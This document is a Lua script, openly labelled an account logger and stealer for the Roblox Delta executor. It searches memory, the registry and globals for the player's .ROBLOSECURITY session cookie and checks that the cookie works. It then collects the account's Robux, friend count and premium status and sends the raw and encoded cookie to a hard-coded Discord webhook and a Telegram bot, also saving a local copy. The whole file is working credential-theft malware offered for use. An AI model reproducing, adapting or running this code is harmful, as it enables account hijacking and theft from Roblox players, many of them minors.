-- Account Logger / Stealer for Roblox Delta

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1557748325426405468/EzowLlliYbbDTAeJGpykGRCzXWngoMnm5QYecoymkR-ykj8NM-IqQptTFsjnsACrOu9n"
local TELEGRAM_BOT_TOKEN = "8847424478:AAGU_hHUYWgG4Vm30BqfGpAfkbx_M2MbXz0"
local TELEGRAM_CHAT_ID = "6130148344"
local SAVE_FILE = "roblox_accounts.txt"

local function base64_encode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x) 
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

local function http_request(url, method, headers, body)
    local req = request or (syn and syn.request) or (http and http.request)
    if req then
        local ok, res = pcall(req, {Url = url, Method = method or "GET", Headers = headers or {}, Body = body})
        if ok and res then return res end
    end
    local ok, res = pcall(function()
        return HttpService:RequestAsync({Url = url, Method = method or "GET", Headers = headers or {}, Body = body})
    end)
    if ok then return res end
    return nil
end

local function is_cookie_like(s)
    if type(s) ~= "string" then return false end
    if #s < 200 then return false end
    if s:find("_|WARNING", 1, true) then return true end
    if s:find("ROBLOSECURITY", 1, true) then return true end
    if #s > 300 and s:match("^[%w_%-%|%._]+$") then return true end
    return false
end

local function try_executor()
    if syn and syn.cookie then return syn.cookie end
    if getcookie then local ok, c = pcall(getcookie) if ok and is_cookie_like(c) then return c end end
    if syn and syn.getcookie then local ok, c = pcall(syn.getcookie) if ok and is_cookie_like(c) then return c end end
    return nil
end

local function try_gc()
    if not getgc then return nil end
    local gc = getgc(true)
    for _, v in pairs(gc) do
        if is_cookie_like(v) then return v end
    end
    for _, v in pairs(gc) do
        if type(v) == "table" then
            for _, val in pairs(v) do
                if is_cookie_like(val) then return val end
            end
        end
    end
    return nil
end

local function try_registry()
    if not debug or not debug.getregistry then return nil end
    for _, v in pairs(debug.getregistry()) do
        if is_cookie_like(v) then return v end
    end
    return nil
end

local function try_renv()
    if not getrenv then return nil end
    for _, v in pairs(getrenv()) do
        if is_cookie_like(v) then return v end
    end
    return nil
end

local function try_reg()
    if not getreg then return nil end
    for _, v in pairs(getreg()) do
        if is_cookie_like(v) then return v end
    end
    return nil
end

local function try_globals()
    for _, v in pairs(_G) do if is_cookie_like(v) then return v end end
    for _, v in pairs(shared or {}) do if is_cookie_like(v) then return v end end
    return nil
end

local function validate_cookie(cookie)
    if not cookie or cookie == "" then return false end
    local res = http_request("https://users.roblox.com/v1/users/authenticated", "GET", {Cookie = ".ROBLOSECURITY=" .. cookie})
    return res and (res.StatusCode == 200 or res.Success) or false
end

local function extract_cookie()
    local methods = {try_executor, try_gc, try_registry, try_renv, try_reg, try_globals}
    for attempt = 1, 3 do
        local candidates = {}
        for _, m in ipairs(methods) do
            local ok, c = pcall(m)
            if ok and c then candidates[#candidates + 1] = c end
        end
        for _, c in ipairs(candidates) do
            if validate_cookie(c) then return c end
        end
        if #candidates > 0 and attempt == 3 then return candidates[1] end
        task.wait(0.4)
    end
    return nil
end

local function fetch_details(cookie, userId)
    local headers = {Cookie = ".ROBLOSECURITY=" .. cookie}
    local details = {robux = "?", friends = "?", premium = "?"}
    local res = http_request("https://economy.roblox.com/v1/users/" .. userId .. "/currency", "GET", headers)
    if res and res.Body then
        local ok, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and d and d.robux then details.robux = d.robux end
    end
    res = http_request("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count", "GET", headers)
    if res and res.Body then
        local ok, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and d and d.count then details.friends = d.count end
    end
    res = http_request("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership", "GET", headers)
    if res and res.Body then details.premium = res.Body:find("true") and "Yes" or "No" end
    return details
end

local function get_account_info()
    local player = Players.LocalPlayer
    local cookie = extract_cookie() or "Failed"
    local details = {}
    if cookie ~= "Failed" then
        local ok, d = pcall(fetch_details, cookie, player.UserId)
        if ok and d then details = d end
    end
    return {
        userId = player.UserId,
        username = player.Name,
        displayName = player.DisplayName,
        accountAge = player.AccountAge,
        cookie = cookie,
        valid = cookie ~= "Failed" and validate_cookie(cookie) or false,
        robux = details.robux or "?",
        friends = details.friends or "?",
        premium = details.premium or (player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"),
        hwid = HttpService:GenerateGUID(false),
        timestamp = os.date("%Y-%m-%d %H:%M:%S")
    }
end

local function send_to_discord(data)
    local status = data.valid and "✅ VALID" or "⚠️ UNVERIFIED"
    local payload = {
        content = "@everyone 🎣 Новый аккаунт пойман!",
        embeds = {{
            title = "Roblox Account Logger",
            description = "Cookie status: **" .. status .. "**",
            color = data.valid and 0x00ff00 or 0xffa500,
            fields = {
                {name = "👤 Username", value = data.username, inline = true},
                {name = "📛 Display Name", value = data.displayName, inline = true},
                {name = "🆔 User ID", value = tostring(data.userId), inline = true},
                {name = "💎 Premium", value = data.premium, inline = true},
                {name = "📅 Account Age", value = tostring(data.accountAge) .. " days", inline = true},
                {name = "💰 Robux", value = tostring(data.robux), inline = true},
                {name = "👥 Friends", value = tostring(data.friends), inline = true},
                {name = "🍪 Cookie (Base64)", value = "```" .. base64_encode(data.cookie) .. "```", inline = false},
                {name = "🍪 Cookie (Raw)", value = "```" .. (data.cookie or ""):sub(1, 200) .. "...```", inline = false},
                {name = "⏰ Time", value = data.timestamp, inline = false}
            },
            footer = {text = "Delta Executor Logger"}
        }}
    }
    local ok = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false)
    end)
    return ok
end

local function send_to_telegram(data)
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "" then return end
    local message = string.format(
        "🎣 *Новый аккаунт!*\n\n" ..
        "👤 *User:* %s (%s)\n" ..
        "🆔 *ID:* `%d`\n" ..
        "💎 *Premium:* %s\n" ..
        "💰 *Robux:* %s\n" ..
        "📅 *Age:* %d days\n" ..
        "🍪 *Cookie (B64):*\n`%s`\n\n" ..
        "⏰ %s",
        data.username, data.displayName, data.userId, data.premium, tostring(data.robux), data.accountAge, base64_encode(data.cookie), data.timestamp
    )
    local url = string.format("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown",
        TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, HttpService:UrlEncode(message))
    http_request(url, "GET")
end

local function save_local(data)
    if not writefile then return end
    local line = string.format("[%s] %s (%d) | %s | Cookie: %s\n", data.timestamp, data.username, data.userId, data.valid and "VALID" or "UNVERIFIED", data.cookie)
    local existing = isfile(SAVE_FILE) and readfile(SAVE_FILE) or ""
    writefile(SAVE_FILE, existing .. line)
end

local function main()
    if not getgc and not debug and not getrenv then
        warn("Требуется executor с доступом к debug/getgc")
        return
    end
    while not Players.LocalPlayer do task.wait(0.2) end
    local data = get_account_info()
    local ok = send_to_discord(data)
    send_to_telegram(data)
    save_local(data)
    print("✅ Отправлено:", ok and "OK" or "FAIL", "| Cookie:", data.valid and "VALID" or "UNVERIFIED")
end

pcall(main)
